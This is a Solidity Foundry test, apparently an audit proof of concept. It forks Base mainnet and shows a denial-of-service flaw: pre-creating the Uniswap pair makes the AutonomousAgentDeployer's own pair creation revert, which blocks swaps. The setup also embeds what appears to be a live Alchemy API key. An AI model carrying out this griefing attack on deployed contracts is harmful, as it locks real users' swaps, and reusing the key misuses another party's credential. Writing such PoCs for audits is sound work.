// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {AutonomousAgentDeployer} from "../src/AutonomousAgentDeployer.sol";
import {AgentBalances} from "../src/AgentBalances.sol";
import {AgentToken} from "../src/AgentToken.sol";
import {ISynapseERC20} from "../src/interfaces/ISynapseERC20.sol";

import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

contract AutonomousAgentDeployerTest is Test {
    AutonomousAgentDeployer public autonomousAgentDeployer;

    AgentBalances public agentBalances;
    AgentToken public agentToken;
    address public agentTokenImp;
    ISynapseERC20 public synapseERC20;

    function setUp() public {
        vm.createSelectFork(
            vm.rpcUrl(
                "https://base-mainnet.g.alchemy.com/v2/8mftSFJdO22ITt73DN6uhAqQML13EBvm"
            ),
            26660216
        );
        autonomousAgentDeployer = AutonomousAgentDeployer(
            0x977FDaA235D15346bFf4e3b3e457887DFf1bdcf3
        );

        agentBalances = AgentBalances(
            0x82ef4B29a5321520FF5829e11eAf2DDcEfa5714F
        );

        agentTokenImp = 0xad67D012f58e06CFbc0AdCd9187e8bcAbE2bC8Dd;

        //Test1 from autonomousAgentDeployer recent deployement
        agentToken = AgentToken(0x8ad6d8c006C5aF6717c4E905b41cDf967610D559);

        synapseERC20 = ISynapseERC20(
            0x96419929d7949D6A801A6909c145C8EEf6A40431
        );
    }

    function testDosUniswapPairCreation() public {
        // at this point we have synapse token and agent token deployed

        // create uniswap v2 pair with agent and synapse token
        IUniswapV2Factory(0x8909Dc15e40173Ff4699343b6eB8132c65e18eC6)
            .createPair(address(agentToken), address(synapseERC20));

        // in initialization the UNISWAP_POOL_CREATION_VALUE is set to 10000000000000000000(10 spec)
        // once the AutonomousAgentDeployer have this amount it should
        // create a uniswap pair

        // provide some liqudity so we reach the require state where
        // totalSPECDeposited[_agentToken] == 10 spec,

        // First we will try to call `swapExactSPECForTokens` with less then this amount
        // such that the spec is accumulated in autonomousAgentDeployer contract

        deal(address(synapseERC20), address(this), 20e18); // get 20 spec
        synapseERC20.approve(address(autonomousAgentDeployer), 9e18);
        autonomousAgentDeployer.swapExactSPECForTokens(
            9e18,
            0,
            address(agentToken),
            block.timestamp
        );
        // at this point we have 9 spec in autonomousAgentDeployer contract
        // Now malicious user have already created a uniswap pair
        // so when we reach the `UNISWAP_POOL_CREATION_VALUE` the function
        // will try to again deploy the pool and this will always revert

        // we will try to call `swapExactSPECForTokens` with 10 more spec

        synapseERC20.approve(address(autonomousAgentDeployer), 10e18);
        vm.expectRevert("UniswapV2: PAIR_EXISTS");
        autonomousAgentDeployer.swapExactSPECForTokens(
            10e18,
            0,
            address(agentToken),
            block.timestamp
        );
    }
}
